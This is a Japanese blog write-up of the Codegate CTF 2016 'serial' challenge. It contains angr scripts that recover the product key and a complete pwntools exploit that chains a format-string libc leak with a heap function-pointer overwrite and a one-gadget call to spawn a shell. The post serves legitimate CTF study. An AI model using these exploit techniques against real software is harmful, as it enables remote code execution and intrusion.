---
layout: post
redirect_from:
  - /blog/2016/10/23/codegate-ctf-2016-serial/
date: "2016-10-23T00:50:29+09:00"
tags: [ "ctf", "codegate-ctf", "pwn", "angr" ]
"target_url": [ "https://github.com/ctfs/write-ups-2016/tree/master/codegate-ctf-2016/pwn/serial-444" ]
---

# Codegate CTF 2016 : serial

## problem

``` sh
$ file ./serial
./serial: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=178aaa6576923592e7fc8534fd8cb21d5f6c5cdb, stripped

$ ./serial
input product key: 615066814080
Correct!
Smash me!
1. Add 2. Remove 3. Dump 4. Quit
choice >> 1
insert >> hoge
Smash me!
1. Add 2. Remove 3. Dump 4. Quit
choice >> 1
insert >> fuga
Smash me!
1. Add 2. Remove 3. Dump 4. Quit
choice >> 3
func : 0x40096e
0. hoge
1. fuga
Smash me!
1. Add 2. Remove 3. Dump 4. Quit
choice >> 4
bye
```

## solution

まず最初に`input product key: `と聞かれる。
angrで殴れば倒せる。この部分は後に効いてこないので忘れてよい。

note管理系のプログラム。
heap上に以下の配列が確保される。chunkそのものもoverflowしているが、他に`malloc`も`free`もないのでここは攻撃不可能。

``` c
struct note_t {
    char content[0x18]; // 0x0
    void (*func)(node_t *) ; // 0x18
}; // 0x20
```

`1. Add`で`content`にoverflowがあり、自身の`func`を書き換えられる。
`3. Dump`で先頭noteの`func`が呼ばれるので、fsaから適当にすればよい。
主なbofはheap上なので`printf`の引数が問題だが、`choice >> `で読んだときのごみがstackに残っているので利用できるし、`argv[0]`あたりも使える。

## implementation

### product key (愚直)

最低限の`find`/`avoid`のみを指定した場合。
$10$分ぐらいかかるが解は出る。

``` python
#!/usr/bin/env python2
import angr

number_only = 0x400d22
wrong = 0x400e78
correct = 0x400e5c

p = angr.Project("./serial")
state = p.factory.entry_state()
pathgroup = p.factory.path_group(state)
pathgroup.explore(find=(correct, ), avoid=(number_only, wrong))

for path in pathgroup.found:
    print 'found', path
    print repr(path.state.posix.dumps(1))
    print repr(path.state.posix.dumps(0))
```

### product key (まとも)

入力を直接メモリに載せ、目的の関数のみを直接実行する場合。
$3$秒で終わる。

``` python
#!/usr/bin/env python2
import angr

key_length = 12
check_function = 0x400cbb
address = 0x602000 + 0x900
number_only = 0x400d22
wrong = 0x400e78
correct = 0x400e5c

p = angr.Project("./serial")
state = p.factory.blank_state(addr=check_function)
key = state.se.BVS(name="key", size=key_length*8)
state.memory.store(address, key)
state.regs.rdi = address
pathgroup = p.factory.path_group(state)
pathgroup.explore(find=(correct, ), avoid=(number_only, wrong))

for path in pathgroup.found:
    print repr(path.state.se.any_str(key))
```

### shell

思考停止してone-gadget RCE投げ込むの、悪影響ありそう。

``` python
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
args = parser.parse_args()
context.log_level = 'debug'

elf = ELF('./serial')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./serial')

p.recvuntil('input product key: ')
p.sendline('615066814080')

def add(s):
    p.recvuntil('choice >> ')
    p.sendline('1')
    p.recvuntil('insert >> ')
    p.send(s)
def remove(i):
    p.recvuntil('choice >> ')
    p.sendline('2')
    p.recvuntil('choice>> ')
    p.sendline(str(i))
def dump(tail='', result=True):
    p.recvuntil('choice >> ')
    p.sendline('3' + tail)
    if result:
        assert p.recvline().startswith('func : ')
        return p.recvuntil('Smash me!\n', drop=True)

# format-string attack
add('%13$s'.ljust(0x18, ' ') + p64(elf.plt['printf']).rstrip('\0') + '\n')
t = dump(' ' * 7 + p64(elf.got['setvbuf']))
remove(0)
setvbuf = u64(t.split('    ')[0].ljust(8, '\0'))
libc_base = setvbuf - libc.symbols['setvbuf']
log.info('libc base: %#x', libc_base)

# one-gadget RCE on Ubuntu 16.04
add(' ' * 0x18 + p64(libc_base + 0xf0897).rstrip('\0') + '\n')
dump(result=False)

time.sleep(1)
p.sendline('id')
p.interactive()
```
